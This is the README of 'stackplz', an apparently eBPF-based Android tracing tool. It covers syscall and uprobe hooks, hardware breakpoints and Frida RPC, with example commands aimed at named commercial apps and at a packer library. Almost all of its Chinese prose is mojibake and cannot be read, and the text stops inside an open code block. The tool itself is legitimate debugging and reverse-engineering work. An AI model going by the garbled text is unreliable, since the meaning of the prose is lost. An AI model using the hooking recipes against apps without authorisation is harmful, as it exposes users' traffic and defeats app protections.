- æ”¯æŒarm64 syscall traceï¼Œå¯ä»¥æ‰“å°å‚æ•°(åŒ…æ‹¬è¯¦ç»†çš„ç»“æž„ä½“ä¿¡æ¯)ã€è°ƒç”¨æ ˆã€å¯„å­˜å™¨
- æ”¯æŒå¯¹64ä½ç”¨æˆ·æ€åŠ¨æ€åº“è¿›è¡Œuprobe hookï¼Œå¯ä»¥æ‰“å°å‚æ•°ã€è°ƒç”¨æ ˆã€å¯„å­˜å™¨
- æ”¯æŒç¡¬ä»¶æ–­ç‚¹åŠŸèƒ½ï¼Œå¯ä»¥æ‰“å°è°ƒç”¨æ ˆã€å¯„å­˜å™¨ï¼Œå¹¶ä¸”æä¾›äº†frida rpcè°ƒç”¨
- æ”¯æŒè¿›ç¨‹å·ã€çº¿ç¨‹å·ã€çº¿ç¨‹åçš„é»‘ç™½åå•è¿‡æ»¤
- æ”¯æŒè¿½è¸ªforkäº§ç”Ÿçš„è¿›ç¨‹

è¦æ±‚ï¼š

- rootæƒé™ï¼Œç³»ç»Ÿå†…æ ¸ç‰ˆæœ¬5.10+ï¼ˆå¯æ‰§è¡Œ`uname -r`æŸ¥çœ‹ï¼‰
- å¯¹äºŽ4.1xçš„å†…æ ¸ï¼Œå†…æ ¸å¼€å¯äº†CONFIG_HAVE_HW_BREAKPOINTï¼Œç¡¬ä»¶æ–­ç‚¹åŠŸèƒ½åŒæ ·å¯ä»¥ä½¿ç”¨

ä¸ä»…ä»…æ˜¯çœŸæœºï¼Œè¿™äº›çŽ¯å¢ƒä¸‹ä¹Ÿå¯ä»¥ä½¿ç”¨ï¼š

- armå¼€å‘æ¿åˆ·å®‰å“é•œåƒ
- armå¼€å‘æ¿/äº‘æœåŠ¡å™¨ + Docker + ReDroid
- Apple Mç³»åˆ—è®¾å¤‡ + å®‰å“å®˜æ–¹arm64æ¨¡æ‹Ÿå™¨
- æœ‰rootæƒé™ï¼Œå†…æ ¸ç‰ˆæœ¬5.10+çš„äº‘çœŸæœºä¹Ÿå¯ä»¥

# ä½¿ç”¨

ä»ŽReleasesæˆ–è€…Github Actionä¸‹è½½æœ€æ–°é¢„ç¼–è¯‘å¥½çš„äºŒè¿›åˆ¶æ–‡ä»¶å³å¯

1. æŽ¨é€åˆ°æ‰‹æœºçš„`/data/local/tmp`ç›®å½•ä¸‹ï¼Œæ·»åŠ å¯æ‰§è¡Œæƒé™å³å¯

```bash
adb push stackplz /data/local/tmp
adb shell
su
chmod +x /data/local/tmp/stackplz
```

æ³¨æ„ï¼š**v3.0.1**ä¹‹å‰ï¼Œä½¿ç”¨ä¸åŒç‰ˆæœ¬æ—¶ï¼Œéœ€è¦é‡Šæ”¾åº“æ–‡ä»¶ï¼Œè¯·ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤

```bash
cd /data/local/tmp && ./stackplz --prepare
```

## 2. é€‰é¡¹è¯´æ˜Ž

stackplzçš„æ‰€æœ‰å¯ç”¨é€‰é¡¹ï¼Œå¯ä»¥é€šè¿‡`./stackplz --help`æŸ¥çœ‹

2.1 **ç”¨äºŽå¯¹ç›®æ ‡è¿›ç¨‹/çº¿ç¨‹è¿›è¡Œè¿‡æ»¤çš„é€‰é¡¹**

æ³¨æ„ï¼šå¦‚æžœå­˜åœ¨å¤šä¸ªç›®æ ‡ï¼Œä½¿ç”¨é€—å·éš”å¼€ï¼›`--no-xxx`æ„ä¸ºé»‘åå•

| é€‰é¡¹ | é»‘åå•é€‰é¡¹ | è¯´æ˜Ž |
| :- | :- | :- |
| -n/--name|  | APPåŒ…åï¼Œåˆ†ç»„å(root/system/shell/app/iso) |
| -u/--uid | --no-uid | ç›®æ ‡uid |
| -p/--pid | --no-pid | ç›®æ ‡pid |
| -t/--tid | --no-tid | ç›®æ ‡tid |
| --tname | --no-tname | ç›®æ ‡çº¿ç¨‹åï¼Œæ³¨æ„æœ€å¤š16å­—èŠ‚ |

2.2 **syscall/uprobe hooké€‰é¡¹**

- -s/--syscall name/group

å³syscall hookï¼ŒåŽè·Ÿç³»ç»Ÿè°ƒç”¨å·å¯¹åº”çš„åå­—ï¼Œæˆ–è€…åˆ†ç»„ï¼Œå¯¹åº”çš„é»‘åå•é€‰é¡¹`--no-syscall`

- -w/--point symbol/offset[type,type,...]

å³uprobe hookï¼Œå¿…é¡»é…åˆ`-l/--lib`ä½¿ç”¨ï¼Œå…·ä½“ç”¨æ³•å‚è€ƒåŽé¢çš„å‘½ä»¤æ¼”ç¤º

2.3 **ç¡¬ä»¶æ–­ç‚¹ç›¸å…³é€‰é¡¹**

| é€‰é¡¹ | é»˜è®¤å€¼ | è¯´æ˜Ž |
| :- | :-: | :- |
| --pid | | ç›®æ ‡è¿›ç¨‹pidï¼Œä¸Ž--brk-libæ­é…ä½¿ç”¨è®¡ç®—æ–­ç‚¹åœ°å€ |
| --brk | | è¦ä¸‹æ–­çš„åœ°å€ |
| --brk-len | 4 | æ–­ç‚¹é•¿åº¦ |
| --brk-lib | | ç›®æ ‡åº“ï¼Œä½¿ç”¨è¯¥é€‰é¡¹æ—¶--brkä¸ºç›¸å¯¹åç§» |
| --brk-pid | -1 | ç›®æ ‡è¿›ç¨‹pidï¼Œé€šå¸¸ä¸å»ºè®®è®¾ç½®è¯¥é€‰é¡¹ |

2.4 **å‘é€ä¿¡å·é€‰é¡¹**

å³`--kill SIGSTOP/SIGABRT/SIGTRAP/...`ï¼Œåªèƒ½è®¾ç½®ä¸€ä¸ªï¼Œæ•ˆæžœæ˜¯åœ¨å‘½ä¸­hookæ—¶å‘ç›®æ ‡è¿›ç¨‹å‘é€ä¿¡å·

æ³¨æ„ï¼šå¯¹äºŽsyscallæ¥è¯´ï¼Œå‘é€ä¿¡å·çš„æ—¶æœºä½äºŽsyscallæ‰§è¡Œå®Œæˆä¹‹åŽï¼Œæ‰€ä»¥å¯¹äºŽexit/exit_groupç­‰syscallå¯èƒ½æ— æ³•å®žçŽ°é¢„æœŸæ•ˆæžœ

2.5 **å‚æ•°è¿‡æ»¤é€‰é¡¹**

å³`-f/--filter`ï¼Œè¯¥é€‰é¡¹ç”¨äºŽè®¾å®šå‚æ•°çš„è¿‡æ»¤è§„åˆ™

| è§„åˆ™ | ç¤ºä¾‹ | è¯´æ˜Ž |
| :- | :- | :- |
| w/white | w:/sbin/su | å­—ç¬¦ä¸²ç™½åå•ï¼Œè¿‡æ»¤ä»¥`/sbin/su`å¼€å¤´çš„å†…å®¹ï¼Œæœ€å¤š256å­—èŠ‚ |
| b/black | b:/sbin/su | å­—ç¬¦ä¸²é»‘åå•ï¼Œè¿‡æ»¤ä»¥`/sbin/su`å¼€å¤´çš„å†…å®¹ï¼Œæœ€å¤š256å­—èŠ‚ |
| bx/bufhex | bx:73ea68 | bufferæ•°æ®ç™½åå•ï¼Œè¿‡æ»¤16è¿›åˆ¶ä»¥`73ea68`å¼€å¤´çš„å†…å®¹ï¼Œæœ€å¤šæ¯”è¾ƒ8å­—èŠ‚ |
| eq/equal | eq:0x748a484d2c | å¯„å­˜å™¨å€¼ç™½åå•ï¼Œè¿‡æ»¤å¯„å­˜å™¨å€¼ç­‰äºŽ`0x748a484d2c`çš„å†…å®¹ |

2.6 **éƒ¨åˆ†å¸ƒå°”ç±»åž‹é€‰é¡¹**

| é€‰é¡¹ | è¯´æ˜Ž |
| :- | :- |
| --auto | è¯¥é€‰é¡¹éœ€è¦é…åˆ--kill SIGSTOPä½¿ç”¨ï¼Œæ•ˆæžœæ˜¯è‡ªåŠ¨æ¢å¤è¢«æŒ‚èµ·çš„è¿›ç¨‹ |
| --btf | æ˜¾å¼å£°æ˜Žå½“å‰çŽ¯å¢ƒçš„å†…æ ¸å¼€å¯äº†CONFIG_DEBUG_INFO_BTF |
| --color | è¯¥é€‰é¡¹éœ€è¦é…åˆ--dumphexä½¿ç”¨ï¼Œæ•ˆæžœæ˜¯åœ¨ç»ˆç«¯æ˜¾ç¤ºé¢œè‰² |
| --dumphex | å¯ç”¨è¯¥é€‰é¡¹åŽï¼Œå¯¹äºŽbufç±»åž‹æ•°æ®å°†è¾“å‡ºä¸ºhexdumpï¼Œé£Žæ ¼ä¸ŽCyberChefä¿æŒä¸€è‡´ |
| --getoff | è¾“å‡ºPCå’ŒLRçš„åç§»ä¿¡æ¯ï¼Œæ³¨æ„ä½¿ç”¨è¯¥é€‰é¡¹ä¼šå¯¼è‡´æ€§èƒ½é™ä½Ž |
| --json | å°†æ—¥å¿—è¾“å‡ºä¸ºjsonæ ¼å¼ |
| --jstack | é…åˆ--kill SIGSTOPä½¿ç”¨ï¼Œå¯å¯¹å †æ ˆä¸­çš„jar/vdexè¿›è¡Œè§£æž |
| --mstack | ç®€æ˜“å®žçŽ°å †æ ˆå›žæº¯ï¼Œæ²¡æœ‰ç¬¦å·ä¿¡æ¯ |
| --nocheck | ç¦ç”¨bpfç‰¹æ€§æ£€æŸ¥ï¼Œæ²¡æœ‰`/proc/config.gz`æˆ–è€…æ˜¯å…¶ä»–è·¯å¾„æ—¶ä½¿ç”¨ |
| --quiet | ä¸åœ¨ç»ˆç«¯è¾“å‡ºæ—¥å¿— |
| --regs | è¾“å‡ºå…¨éƒ¨å¯„å­˜å™¨ |
| --showpc | è¾“å‡ºå †æ ˆåŽŸå§‹PCå€¼ |
| --showtime | è¾“å‡ºè‡ªå¼€æœºä»¥æ¥çš„æ—¶é—´ï¼Œå•ä½ns |
| --showuid | è¾“å‡ºè®°å½•çš„uid |
| --stack | è¾“å‡ºå †æ ˆ |

2.7 **rpcé€‰é¡¹**

ä¸»è¦ç”¨äºŽfridaè”åŠ¨ï¼Œè¿œç¨‹ä¸‹ç¡¬ä»¶æ–­ç‚¹

- server ç›‘å¬å‘½ä»¤ ./stackplz --rpc --stack
- client fridaè„šæœ¬å‚è€ƒ [frida_hw_brk.js](./frida_hw_brk.js)
- ç«¯å£å¯ä»¥é€šè¿‡`--rpc-path`ä¿®æ”¹ï¼Œé»˜è®¤`127.0.0.1:41718`
- ç”¨å…¶ä»–æ–¹å¼å‘socketè”åŠ¨ä¹Ÿå¯ä»¥ï¼Œè‡ªè¡Œå®žçŽ°

2.8 **æ‚é¡¹é€‰é¡¹**

- `-a/--arch` ç›®æ ‡è¿›ç¨‹æž¶æž„ï¼Œé»˜è®¤aarch64ï¼Œè®¡åˆ’ä¸ºaarch32 syscall traceæä¾›æ”¯æŒ
- `-b/--buffer` perfç¼“å†²åŒºå¤§å°ï¼Œé»˜è®¤8ï¼Œå³8M
    - å¢žå¤§è¯¥æ•°å€¼å¯ä»¥å‡å°‘æ•°æ®ä¸¢å¤±ï¼Œå¦‚æžœå¤ªå¤§ä¼šå‡ºçŽ°äº†å¤±è´¥çš„é”™è¯¯ï¼Œè¯·åœæ­¢é‡æ–°è®¾ç½®ä¸€ä¸ªæ•°å€¼ï¼Œé€šå¸¸å»ºè®®ä¸è¶…è¿‡32M
- `-c/--config` é…ç½®æ–‡ä»¶æ¨¡å¼
    - é…ç½®æ–‡ä»¶å…·ä½“ä½¿ç”¨æ–¹å¼è¯·æŸ¥çœ‹[é…ç½®æ–‡ä»¶æ–‡æ¡£](./docs/CONFIG.md)
- `--full-tname` é»˜è®¤å¯¹äºŽä¸€äº›é«˜é¢‘è°ƒç”¨syscallçš„ç³»ç»Ÿçº¿ç¨‹è¿›è¡Œäº†å±è”½ï¼Œå¯ç”¨è¯¥é€‰é¡¹åŽå°†è§£é™¤å±è”½
- `-l/--lib` åŠ¨æ€åº“åæˆ–è€…åŠ¨æ€åº“å®Œæ•´è·¯å¾„ï¼Œé…åˆ`-w/--point`é€‰é¡¹ä½¿ç”¨
- `-o/--out` æ—¥å¿—æ–‡ä»¶åï¼Œé»˜è®¤ä¸ç”Ÿæˆæ—¥å¿—æ–‡ä»¶
- `--dump` å³dumpæ¨¡å¼ï¼ŒhookèŽ·å–åˆ°çš„æ•°æ®ä¸ä¼šè¢«è§£æžï¼Œä»…ä¿å­˜åˆ°å•ä¸ªæ–‡ä»¶
- `--parse` å³é’ˆå¯¹dumpå¾—åˆ°çš„æ–‡ä»¶è¿›è¡Œè§£æžï¼Œå¯èƒ½æ¯”è¾ƒè€—æ—¶ï¼Œå¯èƒ½å­˜åœ¨bug
- `--stack-size` å †æ ˆå¤§å°ï¼Œé»˜è®¤8192å­—èŠ‚ï¼ŒåŸºæœ¬å¤Ÿç”¨ï¼Œæœ€å¤§65528

## 3. å‘½ä»¤æ¼”ç¤º

3.1 **è¿½è¸ªsyscall**

```bash
./stackplz -n com.starbucks.cn --syscall connect,sendto,recvfrom -o tmp.log --dumphex
```

![](./images/Snipaste_2023-07-22_21-17-17.png)

> è‡ªå®šä¹‰syscallå‚æ•°ç±»åž‹

å—é™äºŽä»£ç ç»“æž„ï¼Œæš‚æ—¶é‡‡å–äº†ä¸€ç§è¿‚å›žçš„æ–¹æ³•

å³ï¼Œåœ¨uprobeçš„å†™æ³•ä¸‹ï¼Œæœ«å°¾åŠ ä¸Š`s/ss`ï¼Œå³å¯è½¬ä¸ºhook syscallï¼Œä¸¤ä¸ªsè¡¨ç¤ºsyscallé€€å‡ºæ—¶ä¹ŸåŒæ ·è¯»å–ç»“æž„ä½“çš„è¯¦ç»†æ•°æ®

å¸¸è§„ç±»åž‹æœ«å°¾çš„xè¡¨ç¤ºè¾“å‡ºä¸ºhex

```bash
./stackplz -n com.termux -w writev[int,ptr,intx]s
./stackplz -n com.termux -w writev[ptrx,buf,ptrx]ss --dumphex --color
```

å…³äºŽsyscallåï¼Œè¯·æŸ¥é˜…[Linux kernel syscall tables](https://syscalls.mebeim.net/?table=arm64/64/aarch64/v6.2)

3.2 **è¿½è¸ªlibcçš„open**

æ³¨ï¼šé»˜è®¤è®¾å®šçš„åº“æ˜¯`/apex/com.android.runtime/lib64/bionic/libc.so`ï¼Œè¦è‡ªå®šä¹‰è¯·ä½¿ç”¨`--lib`æŒ‡å®š

```bash
./stackplz -n com.starbucks.cn --point strstr[str,str] --point open[str,int] -o tmp.log
```

![](./images/Snipaste_2023-07-22_21-21-33.png)

3.3 åœ¨å‘½ä¸­uprobe hookæ—¶å‘é€ä¿¡å·

æœ‰æ—¶å€™å¸Œæœ›åœ¨ç»è¿‡ç‰¹å®šç‚¹ä½çš„æ—¶å€™åœæ­¢è¿›ç¨‹ï¼Œä»¥ä¾¿äºŽdumpå†…å­˜ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨`--kill`æ¥å‘é€ä¿¡å·ï¼Œç¤ºä¾‹ï¼š

```bash
./stackplz -n com.sfx.ebpf --lib libnative-lib.so -w _Z5func1v --stack --kill SIGSTOP
./stackplz -n com.starbucks.cn --syscall exit --kill SIGSTOP --stack
```

å¦‚æžœè¦æ¢å¤è¿›ç¨‹è¿è¡Œï¼Œå¯ä»¥ç”¨ä¸‹é¢è¿™æ ·çš„å‘½ä»¤ï¼ˆå¦èµ·ä¸€ä¸ªshellï¼Œrootä¸‹æ‰§è¡Œï¼‰ï¼š

```bash
kill -SIGCONT 4326
```

v3.0.0ç‰ˆæœ¬èµ·ï¼Œå¯ä»¥åœ¨ç»ˆç«¯è¾“å…¥cåŽå›žè½¦æ¢å¤è¿›ç¨‹è¿è¡Œ

3.4 **ç¡¬ä»¶æ–­ç‚¹**ç¤ºä¾‹å¦‚ä¸‹ï¼Œæ”¯æŒçš„æ–­ç‚¹ç±»åž‹ï¼š`r,w,rw,x`

pid + ç»å¯¹åœ°å€

```bash
./stackplz --pid `pidof com.sfx.ebpf` --brk 0x70ddfd63f0:x --stack
```

pid + åç§» + åº“æ–‡ä»¶

```bash
./stackplz --pid `pidof com.sfx.ebpf` --brk 0xf3a4:x --brk-lib libnative-lib.so --stack
```

![](./images/Snipaste_2024-03-04_21-51-12.png)

å¯¹å†…æ ¸ä¸­çš„å‡½æ•°ä¸‹ç¡¬ä»¶æ–­ç‚¹ï¼š

**ï¼ï¼ï¼æ³¨æ„ï¼Œå†…æ ¸å‡½æ•°é€šå¸¸è§¦å‘éžå¸¸é¢‘ç¹ï¼Œè¯¥æ“ä½œå¯èƒ½å¯¼è‡´è®¾å¤‡é‡å¯ï¼Œè¯·è°¨æ…Žä½¿ç”¨ï¼ŒåŽŸå› ä¸æ˜Ž**

```bash
echo 1 > /proc/sys/kernel/kptr_restrict
cat /proc/kallsyms  | grep ""T sys_""
./stackplz --brk 0xffffff93c5beb634:x --pid `pidof com.sfx.ebpf` --stack
./stackplz --brk 0xffffffc0003654dc:x --pid `pidof com.sfx.ebpf` --regs
```

3.5 ä»¥å¯„å­˜å™¨çš„å€¼ä½œä¸ºå¤§å°è¯»å–æ•°æ®ã€æˆ–è€…æŒ‡å®šå¤§å°

```bash
./stackplz --name com.sfx.ebpf -w write[int,buf:x2,int]
./stackplz --name com.sfx.ebpf -w write[int,buf:32,int]
./stackplz --name com.sfx.ebpf -w write[int,buf:0x10,int]
```

è¿›é˜¶ç”¨æ³•ï¼š

åœ¨`libc.so+0xA94E8`å¤„ä¸‹æ–­ï¼Œè¯»å–`x1`ä¸º`int`ï¼Œè¯»å–`sp+0x30-0x2c`ä¸º`ptr`

```bash
./stackplz --name com.sfx.ebpf -w 0xA94E8[int:x1,ptr:sp+0x30-0x2c]
```

åœ¨`libc.so+0xA94E8`å¤„ä¸‹æ–­ï¼Œè¯»å–`x1`ä¸º`int`ï¼Œè¯»å–`sp+0x30-0x2c`ä¸º`buf`ï¼Œé•¿åº¦ä¸º`8`

```bash
./stackplz --name com.sfx.ebpf -w 0xA94E8[int:x1,buf:8:sp+0x30-0x2c]
```

```bash
.text:00000000000A94E4                 LDR             W1, [SP,#0x30+var_2C]
.text:00000000000A94E8                 MOV             W20, W0
```

æŒ‰é»˜è®¤é¡ºåºè¯»å–ï¼Œä»¥åŠæŒ‰æŒ‡å®šå¯„å­˜å™¨è¯»å–ï¼Œä¸‹é¢çš„ç¤ºä¾‹ä¸­ä¸¤ä¸ªæ–¹å¼è¾“å‡ºç»“æžœç›¸åï¼š

```bash
./stackplz --name com.sfx.ebpf -w 0xA94E8[int,int]
./stackplz --name com.sfx.ebpf -w 0xA94E8[int:x1,int:x0]
```

åœ¨`call_constructors`å¤„èŽ·å–`soinfo`å†…å®¹

```bash
# æ‰“å°åç§°å’Œå®Œæ•´è·¯å¾„
./stackplz -n com.coolapk.market -l linker64 -w __dl__ZN6soinfo17call_constructorsEv[ptr,str.f0:x0+409,str:x0+448.] -f w:libjiagu
./stackplz -n com.coolapk.market -l linker64 -w __dl__ZN6soinfo17call_constructorsEv[ptr,std.f0:x0+408,std:x0+432] -f w:libjiagu
# å°† init_array_count_ å’Œ init_array_ å†…å®¹æ‰“å°å‡ºæ¥ 
./stackplz -n com.coolapk.market -l linker64 -w __dl__ZN6soinfo17call_constructorsEv[ptr,std.f0:x0+408,*int:x0+160,ptr_arr:6:x0+152.] -f w:libjiagu --dumphex --color
```

åç§»è¯´æ˜Žå¦‚ä¸‹ï¼Œè¿™äº›åç§»å¯ä»¥æ ¹æ®`call_constructors get_realpath get_soname`å¾—åˆ°ï¼š

- 408 -> std::string soname_;
- 432 -> std::string realpath_;
- 152 -> linker_ctor_function_t* init_array_;
- 160 -> size_t init_array_count_;

åœ¨æŒ‡å®šåç§»å¤„åšé€€å‡ºè¯»å–ï¼Œé€€å‡ºåç§»å³`RET`æŒ‡ä»¤çš„åç§»ï¼Œç¤ºä¾‹å¦‚ä¸‹

```bash
./stackplz -n com.termux -w gettimeofday[timeval,timezone]0x4B320
./stackplz -n com.termux -w 0x9D150[int,buf:x2,int]0x9D164 --dumphex --color
```

3.6 æŒ‰åˆ†ç»„æ‰¹é‡è¿½è¸ªè¿›ç¨‹

è¿½è¸ªå…¨éƒ¨APPç±»åž‹çš„è¿›ç¨‹ï¼Œä½†æ˜¯æŽ’é™¤ä¸€ä¸ªç‰¹å®šçš„uidï¼š

```bash
./stackplz -n app --no-uid 10084 --point open[str,int] -o tmp.log
```

åŒæ—¶è¿½è¸ªä¸€ä¸ªAPPå’Œï¼ˆæ‰€æœ‰ï¼‰isolatedè¿›ç¨‹ï¼š

```bash
./stackplz -n com.starbucks.cn,iso --syscall openat -o tmp.log
```

å¯é€‰çš„è¿›ç¨‹åˆ†ç»„ï¼šroot system shell app iso

3.7 æŒ‰åˆ†ç»„æ‰¹é‡è¿½è¸ªsyscall

```bash
./stackplz -n com.xingin.xhs -s %file,%net --no-syscall openat,recvfrom
```

å¯é€‰çš„syscallåˆ†ç»„å¦‚ä¸‹ï¼š

- all
- %attr %file
- %exec %clone %process
- %net %send %recv %read %write
- %signal
- %kill %exit %dup
- %epoll %stat

å…·ä½“åˆ†ç»„æƒ…å†µè¯·æŸ¥çœ‹[Parse_SyscallNames](./user/config/config_module.go)

3.8 åº”ç”¨è¿‡æ»¤è§„åˆ™

é»‘ç™½åå•ï¼š

```bash
./stackplz -n com.starbucks.cn -s openat:f0.f1.f2 -f w:/system -f w:/dev -f b:/system/lib64 -o tmp.log
```

LRæ¯”è¾ƒï¼Œéœ€è¦æå‰è®¡ç®—ç”¨äºŽæ¯”è¾ƒçš„å€¼ï¼š

```bash
./stackplz -n com.chinarainbow.tft -w memcpy[ptr,ptr,int,ptr.f0:lr] -f eq:0x748a484d2c --stack --kill SIGSTOP
```

å¼•å…¥bufferæ•°æ®æ¯”è¾ƒï¼Œ`bx/bufhex`ï¼Œå¯ä»¥è¿›è¡Œæœ€å¤š8å­—èŠ‚çš„æ¯”è¾ƒ

```bash
./stackplz -n com.netease.cloudmusic -w sendto[int,buf.f0:x2,int] -f bx:73ea68 -o tmp.log --dumphex --color --stack
```

3.9 å°è¯•è¾“å‡ºæ›´è¯¦ç»†çš„javaå †æ ˆ

æ³¨æ„ï¼š`--jstack`å¿…éœ€æ­é…`--kill SIGSTOP`ä½¿ç”¨ï¼Œåº”ç”¨è¢«æŒ‚èµ·åŽå¯æŒ‰cå›žè½¦æ¢å¤è¿è¡Œ

```bash
./stackplz_arm64 -n com.wsy.crashcatcher -w raise --stack --jstack --showpc --kill SIGSTOP
```

---

ä½¿ç”¨æç¤ºï¼š

- `--showtime` è¾“å‡ºäº‹ä»¶å‘ç”Ÿçš„æ—¶é—´
    - å› ä¸ºæ—¥å¿—ä¸­çš„é¡ºåºå’Œå®žé™…å‘ç”Ÿé¡ºåºä¸å®Œå…¨ä¸€è‡´
    - å¦‚æžœè¦ç²¾ç¡®å‘ç”Ÿé¡ºåºï¼Œè¯·ä½¿ç”¨è¯¥é€‰é¡¹
- `--showuid` è¾“å‡ºè§¦å‘äº‹ä»¶çš„è¿›ç¨‹çš„uid
    - åœ¨å¤§èŒƒå›´è¿½è¸ªçš„æ—¶å€™å»ºè®®ä½¿ç”¨
- å¯ä»¥ç”¨`--name`æŒ‡å®šåŒ…åï¼Œç”¨`--uid`æŒ‡å®šè¿›ç¨‹æ‰€å±žuidï¼Œç”¨`--pid`æŒ‡å®šè¿›ç¨‹
- é»˜è®¤hookçš„åº“æ˜¯`/apex/com.android.runtime/lib64/bionic/libc.so`ï¼Œå¯ä»¥åªæä¾›ç¬¦å·è¿›è¡Œhook
- hookç›®æ ‡åŠ è½½çš„åº“æ—¶ï¼Œé»˜è®¤åœ¨å¯¹åº”çš„åº“ç›®å½•æœç´¢ï¼Œæ‰€ä»¥å¯ä»¥ç›´æŽ¥æŒ‡å®šåº“åè€Œä¸éœ€è¦å®Œæ•´è·¯å¾„
    - ä¾‹å¦‚ `/data/app/~~t-iSPdaqQLZBOa9bm4keLA==/com.sfx.ebpf-C_ceI-EXetM4Ma7GVPORow==/lib/arm64`
- å¦‚æžœè¦hookçš„åº“æ— æ³•è¢«è‡ªåŠ¨æ£€ç´¢åˆ°ï¼Œè¯·æä¾›åœ¨å†…å­˜ä¸­åŠ è½½çš„å®Œæ•´è·¯å¾„
    - æœ€å‡†ç¡®çš„åšæ³•æ˜¯å½“ç¨‹åºè¿è¡Œæ—¶ï¼ŒæŸ¥çœ‹ç¨‹åºçš„`/proc/{pid}/maps`å†…å®¹ï¼Œè¿™é‡Œçš„è·¯å¾„æ˜¯å•¥å°±æ˜¯å•¥
- hookåŠ¨æ€åº“è¯·ä½¿ç”¨`--point/-w`ï¼Œå¯è®¾ç½®å¤šä¸ªï¼Œè¯­æ³•æ˜¯{ç¬¦å·/åŸºå€åç§»}{+ç¬¦å·åç§»}{[å‚æ•°ç±»åž‹,å‚æ•°ç±»åž‹...]}
    - --point _Z5func1v
    - --point strstr[str,str] --point open[str,int]
    - --point write[int,buf:64]
    - --point 0x9542c[str,str]
    - --point strstr+0x4[str,str]
- hook syscalléœ€è¦æŒ‡å®š`--syscall/-s`é€‰é¡¹ï¼Œå¤šä¸ªsyscallè¯·ä½¿ç”¨`,`éš”å¼€
    - --syscall openat
- ç‰¹åˆ«çš„ï¼ŒæŒ‡å®šä¸º`all`è¡¨ç¤ºè¿½è¸ªå…¨éƒ¨syscall
    - --syscall all
- **ç‰¹åˆ«è¯´æ˜Ž**ï¼Œå¦‚æžœæœŸæœ›å°†`0xffffff9c`è¿™æ ·çš„ç»“æžœè¾“å‡ºä¸ºè´Ÿæ•°ï¼Œè¯·æ˜Žç¡®æŒ‡å®šç±»åž‹ä¸º`int`
- æ³¨æ„ï¼Œæœ¬é¡¹ç›®ä¸­syscallçš„è¿”å›žå€¼é€šå¸¸æ˜¯**errno**ï¼Œä¸Žlibcçš„å‡½æ•°è¿”å›žç»“æžœä¸ä¸€å®šä¸€è‡´
- `--dumphex`è¡¨ç¤ºå°†æ•°æ®æ‰“å°ä¸ºhexdumpï¼Œå¦åˆ™å°†è®°å½•ä¸º`ascii + hex`çš„å½¢å¼ï¼Œå¦å¤–å¯æ·»åŠ `--color`é€‰é¡¹
- è¾“å‡ºåˆ°æ—¥å¿—æ–‡ä»¶æ·»åŠ `-o/--out tmp.log`ï¼Œåªè¾“å‡ºåˆ°æ—¥å¿—ï¼Œä¸è¾“å‡ºåˆ°ç»ˆç«¯å†åŠ ä¸€ä¸ª`--quiet`å³å¯

**æ³¨æ„**ï¼Œé»˜è®¤å±è”½ä¸‹åˆ—çº¿ç¨‹ï¼ŒåŽŸå› æ˜¯å®ƒä»¬å±žäºŽæ¸²æŸ“æˆ–åŽå°ç›¸å…³çš„çº¿ç¨‹ï¼Œä¼šè§¦å‘å¤§é‡çš„syscallè°ƒç”¨

å¦‚æžœæœ‰éœ€æ±‚è¿½è¸ªä¸‹åˆ—çº¿ç¨‹ï¼Œè¯·æ·»åŠ `--full-tname`ä½¿ç”¨ï¼Œæˆ–è€…æ‰‹åŠ¨ä¿®æ”¹`DefaultThreadBlacklist`å‡½æ•°

- Profile Saver
- Runtime worker
- ReferenceQueueD
- FinalizerDaemon
- FinalizerWatchd
- HeapTaskDaemon
- perfetto_hprof_
- RenderThread
- FinalizerDaemon
- RxCachedThreadS
- mali-cmar-backe
- mali-utility-wo
- mali-mem-purge
- mali-hist-dump
- mali-event-hand
- hwuiTask0
- hwuiTask1
- NDK MediaCodec_

æ›´å¤šç”¨æ³•ï¼Œè¯·é€šè¿‡`-h/--help`æŸ¥çœ‹ï¼š

- `/data/local/tmp/stackplz -h`

# ç¼–è¯‘

å¯å‚è€ƒ[workflow](.github/workflows/build.yml)æˆ–æŸ¥çœ‹[ç¼–è¯‘æ–‡æ¡£](./docs/BUILD.md)ï¼š

# Q & A

1. `preload_libs`é‡Œé¢çš„åº“æ€Žä¹ˆç¼–è¯‘çš„ï¼Ÿ

å‚è§ï¼š[unwinddaemon](https://github.com/SeeFlowerX/unwinddaemon)ï¼Œæ³¨æ„v3.0.3ä¹‹åŽé‡‡ç”¨äº†æ–°çš„ç¼–è¯‘æ–¹æ¡ˆ

2. perf event ring buffer full, dropped 9 samples

ä½¿ç”¨`-b/-buffer`è®¾ç½®æ¯ä¸ªCPUçš„ç¼“å†²åŒºå¤§å°ï¼Œé»˜è®¤ä¸º`8M`ï¼Œå¦‚æžœå‡ºçŽ°æ•°æ®ä¸¢å¤±çš„æƒ…å†µï¼Œè¯·é€‚å½“å¢žåŠ è¿™ä¸ªå€¼ï¼Œç›´åˆ°ä¸å†å‡ºçŽ°æ•°æ®ä¸¢å¤±çš„æƒ…å†µ

å‘½ä»¤ç¤ºæ„å¦‚ä¸‹ï¼š

```bash
./stackplz -n com.starbucks.cn -b 32 --syscall all -o tmp.log
```

å¢žå¤§ç¼“å†²åŒºå¤§å°ä¹Ÿå¯èƒ½å¸¦æ¥æ–°çš„é—®é¢˜ï¼Œæ¯”å¦‚åˆ†é…å¤±è´¥ï¼Œè¿™ä¸ªæ—¶å€™å»ºè®®å°½å¯èƒ½æ¸…ç†æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹

> failed to create perf ring for CPU 0: can't mmap: cannot allocate memory

3. é€šè¿‡ç¬¦å·hookç¡®å®šè°ƒç”¨äº†ä½†æ˜¯ä¸è¾“å‡ºä¿¡æ¯ï¼Ÿ

æŸäº›ç¬¦å·å­˜åœ¨å¤šç§å®žçŽ°ï¼ˆæˆ–è€…é‡å®šä½ï¼Ÿï¼‰ï¼Œè¿™ä¸ªæ—¶å€™éœ€è¦æŒ‡å®šå…·ä½“ä½¿ç”¨çš„ç¬¦å·æˆ–è€…åç§»

ä¾‹å¦‚`strchr`å¯èƒ½å®žé™…ä½¿ç”¨çš„æ˜¯`__strchr_aarch64`ï¼Œè¿™ä¸ªæ—¶å€™åº”è¯¥æŒ‡å®š`__strchr_aarch64`è€Œä¸æ˜¯`strchr`

```bash
coral:/data/local/tmp # readelf -s /apex/com.android.runtime/lib64/bionic/libc.so | grep strchr
   868: 00000000000b9f00    32 GNU_IFUNC GLOBAL DEFAULT   14 strchrnul
   869: 00000000000b9ee0    32 GNU_IFUNC GLOBAL DEFAULT   14 strchr
